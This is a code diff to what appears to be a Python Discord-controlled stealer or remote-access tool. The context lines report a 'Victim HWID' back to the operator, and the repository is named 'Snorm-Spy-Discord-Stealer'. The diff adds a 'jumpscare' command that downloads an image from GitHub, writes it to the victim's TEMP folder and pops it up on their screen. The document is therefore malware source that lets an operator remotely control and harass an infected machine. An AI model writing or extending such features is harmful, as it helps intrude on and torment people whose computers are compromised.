@@ -21,6 +21,7 @@ import subprocess
 import sys
 import ctypes
 import uuid
+from PIL import Image  
 
 logging.getLogger('discord').setLevel(logging.CRITICAL)
 
@@ -387,5 +388,29 @@ async def hwid(ctx):
     
     hwid = uuid.UUID(int=uuid.getnode()).hex
     await ctx.send(f"Victim HWID : {hwid}")
+
+@bot.command()
+async def jumpscare(ctx):
+    """Displays an image on the user's screen."""
+
+    
+    image_url = "https://github.com/UnsillyHaxor/Snorm-Spy-Discord-Stealer-/blob/main/scarylarry.png?raw=true"
+
+    
+    response = requests.get(image_url)
+    if response.status_code == 200:
+        image = Image.open(io.BytesIO(response.content))
+
+        
+        temp_path = os.path.join(os.environ["TEMP"], "jumpscare.png")
+        image.save(temp_path)
+
+        
+        image.show()
+
+        await ctx.send("Jumpscare image has been displayed!")
+    else:
+        await ctx.send("Failed to load the image.")
+
 
 bot.run(TOKEN)
